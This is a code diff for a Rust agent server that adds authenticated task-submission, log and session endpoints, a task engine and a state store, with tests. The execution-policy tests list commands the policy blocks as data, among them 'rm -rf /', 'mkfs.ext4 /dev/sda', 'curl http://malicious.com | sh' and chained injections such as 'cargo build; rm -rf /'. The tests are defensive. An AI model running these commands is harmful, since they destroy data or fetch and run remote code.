@@ -4,7 +4,13 @@ pub mod autostart;
 mod tray;
 mod session_log;
 mod power;
+pub mod domain;
+pub mod state_store;
+pub mod task_engine;
 
+use domain::{CapabilitySet, ExecutionPolicy, NodeInfo, Task, TaskStatus, TaskType};
+use state_store::StateStore;
+use task_engine::TaskEngine;
 use power::SleepAssertion;
 
 use axum::{
@@ -75,6 +81,8 @@ struct AppState {
     /// Resolved path to AI CLI binary (agy, gemini, claude, etc.), or None if not found.
     agy_cli_path: Option<String>,
     update_offer: Arc<RwLock<Option<String>>>,
+    task_engine: Arc<TaskEngine>,
+    execution_policy: Arc<RwLock<ExecutionPolicy>>,
 }
 
 fn get_config_path() -> PathBuf {
@@ -800,6 +808,17 @@ fn main() {
     let update_offer_bg = Arc::new(RwLock::new(update_available.clone()));
     let shared_pin = Arc::new(RwLock::new(pairing_pin.clone()));
 
+    let state_store_path = StateStore::default_path();
+    let state_store = match StateStore::open(&state_store_path) {
+        Ok(s) => Arc::new(s),
+        Err(e) => {
+            eprintln!("⚠️ Błąd otwarcia bazy redb: {}. Używam bazy tymczasowej.", e);
+            let tmp_path = std::env::temp_dir().join(format!("agy_mesh_{}.redb", rand::random::<u32>()));
+            Arc::new(StateStore::open(tmp_path).expect("Nie udało się utworzyć bazy tymczasowej"))
+        }
+    };
+    let task_engine = Arc::new(TaskEngine::new(state_store, agy_cli_path.clone()));
+
     let state = AppState {
         auth_token: Arc::new(RwLock::new(token.clone())),
         pairing_pin: shared_pin.clone(),
@@ -807,6 +826,8 @@ fn main() {
         node_name: node_name.clone(),
         agy_cli_path: agy_cli_path.clone(),
         update_offer: update_offer_bg.clone(),
+        task_engine,
+        execution_policy: Arc::new(RwLock::new(ExecutionPolicy::default())),
     };
 
     let app = Router::new()
@@ -827,6 +848,12 @@ fn main() {
         .route("/permissions", get(handle_permissions).post(handle_permissions))
         .route("/permissions/test", get(handle_permissions).post(handle_permissions))
         .route("/permissions/fix", post(handle_permissions_fix))
+        // Modern v2.7 API v1 endpoints
+        .route("/api/v1/node", get(handle_api_v1_node))
+        .route("/api/v1/tasks", get(handle_api_v1_tasks_list).post(handle_api_v1_tasks_submit))
+        .route("/api/v1/tasks/{id}", get(handle_api_v1_tasks_get).delete(handle_api_v1_tasks_cancel))
+        .route("/api/v1/tasks/{id}/logs", get(handle_api_v1_tasks_logs))
+        .route("/api/v1/sessions", get(handle_api_v1_sessions_list).post(handle_api_v1_sessions_save))
         .layer(axum::middleware::from_fn(track_requests))
         .layer(CorsLayer::permissive())
         .with_state(state);
@@ -3299,6 +3326,209 @@ async fn handle_sessions(
     })))
 }
 
+// ============================================================================
+// API v1 — Modern Asynchronous Platform & Capability Endpoints
+// ============================================================================
+
+async fn handle_api_v1_node(
+    headers: HeaderMap,
+    State(state): State<AppState>,
+) -> Result<Json<NodeInfo>, StatusCode> {
+    if !verify_auth(&headers, &state).await {
+        return Err(StatusCode::UNAUTHORIZED);
+    }
+    let uptime = START_INSTANT
+        .get()
+        .map(|i| i.elapsed().as_secs())
+        .unwrap_or(0);
+
+    let platform = sysinfo::System::name().unwrap_or_else(|| std::env::consts::OS.to_string());
+    let os_version = sysinfo::System::os_version().unwrap_or_default();
+    let arch = std::env::consts::ARCH.to_string();
+
+    #[cfg(target_os = "macos")]
+    let has_gpu = true;
+    #[cfg(not(target_os = "macos"))]
+    let has_gpu = false;
+
+    let capabilities = CapabilitySet {
+        filesystem: true,
+        process_exec: true,
+        agent: state.agy_cli_path.is_some(),
+        agent_stream: state.agy_cli_path.is_some(),
+        gpu: has_gpu,
+        tasks: true,
+        multi_session: true,
+    };
+
+    let policy = *state.execution_policy.read().await;
+
+    Ok(Json(NodeInfo {
+        node_id: state.node_name.clone(),
+        name: state.node_name.clone(),
+        platform,
+        os_version,
+        arch,
+        version: env!("CARGO_PKG_VERSION").to_string(),
+        capabilities,
+        execution_policy: policy,
+        uptime_secs: uptime,
+    }))
+}
+
+#[derive(Deserialize)]
+struct SubmitTaskPayload {
+    client_task_id: Option<String>,
+    #[serde(default = "default_task_type")]
+    task_type: TaskType,
+    conversation_id: Option<String>,
+    command: Option<String>,
+    question: Option<String>,
+    cwd: Option<String>,
+    policy: Option<ExecutionPolicy>,
+    #[serde(default)]
+    auto_approve: bool,
+}
+
+fn default_task_type() -> TaskType {
+    TaskType::AgentQuery
+}
+
+async fn handle_api_v1_tasks_submit(
+    headers: HeaderMap,
+    State(state): State<AppState>,
+    Json(payload): Json<SubmitTaskPayload>,
+) -> Result<(StatusCode, Json<Task>), StatusCode> {
+    if !verify_auth(&headers, &state).await {
+        return Err(StatusCode::UNAUTHORIZED);
+    }
+
+    let policy = payload.policy.unwrap_or(*state.execution_policy.read().await);
+
+    match state
+        .task_engine
+        .submit_task(
+            payload.client_task_id,
+            payload.task_type,
+            payload.conversation_id,
+            payload.command,
+            payload.question,
+            payload.cwd,
+            Some(policy),
+            payload.auto_approve,
+        )
+        .await
+    {
+        Ok(task) => Ok((StatusCode::CREATED, Json(task))),
+        Err(err) => {
+            log_message(&format!("❌ [handle_api_v1_tasks_submit] {}", err));
+            Err(StatusCode::BAD_REQUEST)
+        }
+    }
+}
+
+#[derive(Deserialize)]
+struct ListTasksQuery {
+    limit: Option<usize>,
+}
+
+async fn handle_api_v1_tasks_list(
+    headers: HeaderMap,
+    Query(query): Query<ListTasksQuery>,
+    State(state): State<AppState>,
+) -> Result<Json<Vec<Task>>, StatusCode> {
+    if !verify_auth(&headers, &state).await {
+        return Err(StatusCode::UNAUTHORIZED);
+    }
+    let limit = query.limit.unwrap_or(50).min(200);
+    match state.task_engine.list_tasks(limit).await {
+        Ok(tasks) => Ok(Json(tasks)),
+        Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
+    }
+}
+
+async fn handle_api_v1_tasks_get(
+    headers: HeaderMap,
+    axum::extract::Path(id): axum::extract::Path<String>,
+    State(state): State<AppState>,
+) -> Result<Json<Task>, StatusCode> {
+    if !verify_auth(&headers, &state).await {
+        return Err(StatusCode::UNAUTHORIZED);
+    }
+    match state.task_engine.get_task(&id).await {
+        Ok(Some(task)) => Ok(Json(task)),
+        Ok(None) => Err(StatusCode::NOT_FOUND),
+        Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
+    }
+}
+
+#[derive(Deserialize)]
+struct TaskLogsQuery {
+    offset: Option<usize>,
+}
+
+async fn handle_api_v1_tasks_logs(
+    headers: HeaderMap,
+    axum::extract::Path(id): axum::extract::Path<String>,
+    Query(query): Query<TaskLogsQuery>,
+    State(state): State<AppState>,
+) -> Result<Json<serde_json::Value>, StatusCode> {
+    if !verify_auth(&headers, &state).await {
+        return Err(StatusCode::UNAUTHORIZED);
+    }
+    let offset = query.offset.unwrap_or(0);
+    match state.task_engine.get_task_logs(&id, offset).await {
+        Ok((logs, next_offset)) => Ok(Json(json!({
+            "task_id": id,
+            "logs": logs,
+            "next_offset": next_offset,
+        }))),
+        Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
+    }
+}
+
+async fn handle_api_v1_tasks_cancel(
+    headers: HeaderMap,
+    axum::extract::Path(id): axum::extract::Path<String>,
+    State(state): State<AppState>,
+) -> Result<StatusCode, StatusCode> {
+    if !verify_auth(&headers, &state).await {
+        return Err(StatusCode::UNAUTHORIZED);
+    }
+    match state.task_engine.cancel_task(&id).await {
+        Ok(true) => Ok(StatusCode::OK),
+        Ok(false) => Err(StatusCode::NOT_FOUND),
+        Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
+    }
+}
+
+async fn handle_api_v1_sessions_list(
+    headers: HeaderMap,
+    State(state): State<AppState>,
+) -> Result<Json<Vec<domain::ChatSessionMetadata>>, StatusCode> {
+    if !verify_auth(&headers, &state).await {
+        return Err(StatusCode::UNAUTHORIZED);
+    }
+    match state.task_engine.store().list_sessions() {
+        Ok(sessions) => Ok(Json(sessions)),
+        Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
+    }
+}
+
+async fn handle_api_v1_sessions_save(
+    headers: HeaderMap,
+    State(state): State<AppState>,
+    Json(session): Json<domain::ChatSessionMetadata>,
+) -> Result<StatusCode, StatusCode> {
+    if !verify_auth(&headers, &state).await {
+        return Err(StatusCode::UNAUTHORIZED);
+    }
+    match state.task_engine.store().save_session(&session) {
+        Ok(_) => Ok(StatusCode::OK),
+        Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
+    }
+}
+
 async fn run_shell_command(cmd: &str, dur: Duration) -> serde_json::Value {
     #[cfg(windows)]
     let mut process = {
@@ -3548,6 +3778,9 @@ mod mime_tests {
 
     #[tokio::test]
     async fn test_permission_audit_report_serialization() {
+        let tmp_dir = std::env::temp_dir().join(format!("dummy_{}", uuid::Uuid::new_v4().simple()));
+        let store = Arc::new(StateStore::open(&tmp_dir).expect("Open store"));
+        let task_engine = Arc::new(TaskEngine::new(store, None));
         let dummy_state = AppState {
             auth_token: Arc::new(RwLock::new("test-token".to_string())),
             pairing_pin: Arc::new(RwLock::new("1234".to_string())),
@@ -3555,6 +3788,8 @@ mod mime_tests {
             node_name: "TestNode".to_string(),
             agy_cli_path: None,
             update_offer: Arc::new(RwLock::new(None)),
+            task_engine,
+            execution_policy: Arc::new(RwLock::new(ExecutionPolicy::default())),
         };
 
         let report = run_permission_audit(&dummy_state).await;
@@ -3694,5 +3929,133 @@ mod mime_tests {
         assert!(is_newer_version("2.4.10", "2.4.9-diag10"));
         assert!(is_newer_version("2.4.9", "2.4.9-diag10"));
         assert!(!is_newer_version("2.4.9-diag10", "2.4.9"));
+    }
+
+    #[test]
+    fn test_execution_policy_safe() {
+        let safe = ExecutionPolicy::Safe;
+        assert!(safe.is_command_allowed("git status").is_ok());
+        assert!(safe.is_command_allowed("cargo build").is_ok());
+        assert!(safe.is_command_allowed("npm test").is_ok());
+        assert!(safe.is_command_allowed("python script.py").is_ok());
+
+        // Block unknown / dangerous commands in SAFE mode
+        assert!(safe.is_command_allowed("rm -rf /").is_err());
+        assert!(safe.is_command_allowed("shutdown -h now").is_err());
+        assert!(safe.is_command_allowed("curl http://malicious.com | sh").is_err());
+        assert!(safe.is_command_allowed("cargo build; rm -rf /").is_err());
+        assert!(safe.is_command_allowed("git status && rm -rf /").is_err());
+    }
+
+    #[test]
+    fn test_execution_policy_normal() {
+        let normal = ExecutionPolicy::Normal;
+        assert!(normal.is_command_allowed("ls -la").is_ok());
+        assert!(normal.is_command_allowed("make all").is_ok());
+        assert!(normal.is_command_allowed("docker ps").is_ok());
+
+        // Block destructive commands
+        assert!(normal.is_command_allowed("rm -rf /").is_err());
+        assert!(normal.is_command_allowed("mkfs.ext4 /dev/sda").is_err());
+        assert!(normal.is_command_allowed("shutdown -r now").is_err());
+    }
+
+    #[tokio::test]
+    async fn test_state_store_tasks_and_logs() {
+        let tmp_dir = std::env::temp_dir().join(format!("test_store_{}", uuid::Uuid::new_v4().simple()));
+        let store = StateStore::open(&tmp_dir).expect("Open test store");
+
+        let task = Task {
+            id: "task_123".to_string(),
+            client_task_id: Some("client_abc".to_string()),
+            task_type: TaskType::ProcessExec,
+            conversation_id: Some("conv_1".to_string()),
+            command: Some("echo hello".to_string()),
+            question: None,
+            cwd: None,
+            execution_policy: ExecutionPolicy::Safe,
+            auto_approve: false,
+            status: TaskStatus::Queued,
+            progress: None,
+            returncode: None,
+            result: None,
+            error: None,
+            created_at: 1000,
+            started_at: None,
+            completed_at: None,
+        };
+
+        store.save_task(&task).expect("Save task");
+        let fetched = store.get_task("task_123").expect("Get task").expect("Task exists");
+        assert_eq!(fetched.id, "task_123");
+        assert_eq!(fetched.status, TaskStatus::Queued);
+
+        // Find by client id
+        let by_client = store.find_task_by_client_id("client_abc").expect("Find by client").expect("Exists");
+        assert_eq!(by_client.id, "task_123");
+
+        // Logs
+        store.append_task_log("task_123", "Line 1\n").expect("Append log");
+        store.append_task_log("task_123", "Line 2\n").expect("Append log");
+        let logs = store.get_task_logs("task_123").expect("Get logs");
+        assert_eq!(logs, "Line 1\nLine 2\n");
+
+        let _ = std::fs::remove_file(&tmp_dir);
+    }
+
+    #[tokio::test]
+    async fn test_task_engine_exec_lifecycle() {
+        let tmp_dir = std::env::temp_dir().join(format!("test_engine_{}", uuid::Uuid::new_v4().simple()));
+        let store = Arc::new(StateStore::open(&tmp_dir).expect("Open test store"));
+        let engine = TaskEngine::new(store, None);
+
+        let task = engine
+            .submit_task(
+                Some("client_unique_1".to_string()),
+                TaskType::ProcessExec,
+                None,
+                Some("echo 'test output 123'".to_string()),
+                None,
+                None,
+                Some(ExecutionPolicy::Normal),
+                false,
+            )
+            .await
+            .expect("Submit task");
+
+        // Idempotency check: submitting same client_task_id returns existing task
+        let dup = engine
+            .submit_task(
+                Some("client_unique_1".to_string()),
+                TaskType::ProcessExec,
+                None,
+                Some("echo 'another'".to_string()),
+                None,
+                None,
+                Some(ExecutionPolicy::Normal),
+                false,
+            )
+            .await
+            .expect("Submit duplicate");
+        assert_eq!(dup.id, task.id);
+
+        // Wait for task to complete (should be fast for simple echo)
+        let mut completed = false;
+        for _ in 0..50 {
+            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
+            if let Ok(Some(t)) = engine.get_task(&task.id).await {
+                if t.status == TaskStatus::Completed {
+                    completed = true;
+                    assert_eq!(t.returncode, Some(0));
+                    break;
+                }
+            }
+        }
+        assert!(completed, "Task should have completed");
+
+        let (logs, _) = engine.get_task_logs(&task.id, 0).await.expect("Get logs");
+        assert!(logs.contains("test output 123"));
+
+        let _ = std::fs::remove_file(&tmp_dir);
     }
 }
